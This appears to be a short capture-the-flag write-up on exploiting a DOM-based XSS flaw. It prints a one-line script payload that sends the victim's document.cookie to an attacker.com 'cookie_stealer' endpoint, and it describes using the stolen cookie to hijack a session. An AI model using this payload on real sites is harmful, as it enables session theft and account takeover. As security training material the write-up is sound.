Title: DOM-based XSS to Steal Session Cookies

In a recent CTF event, I came across a web application that used JavaScript to display user input directly on the page without proper sanitization. This led me to suspect that the application might be vulnerable to a DOM-based Cross-Site Scripting (XSS) attack.

To test for DOM-based XSS, I crafted a malicious input that contained JavaScript code to steal a user's session cookie. The payload looked like this:

```
<script>document.location='https://attacker.com/cookie_stealer?cookie='+encodeURIComponent(document.cookie);</script>
```

I submitted the payload as input in the vulnerable field of the web application. When a user visited the page and their browser executed the malicious JavaScript code, their session cookie was sent to my attacker-controlled domain.

By stealing the session cookie of an authenticated user, I was able to hijack their session and access restricted areas of the web application. Inside one of these restricted areas, I found the flag for the Web Exploitation challenge.

This CTF writeup emphasizes the importance of properly sanitizing and encoding user input in web applications to prevent DOM-based XSS attacks. By exploiting the DOM-based XSS vulnerability, I was able to steal session cookies, hijack user sessions, and uncover the flag needed to complete the challenge.
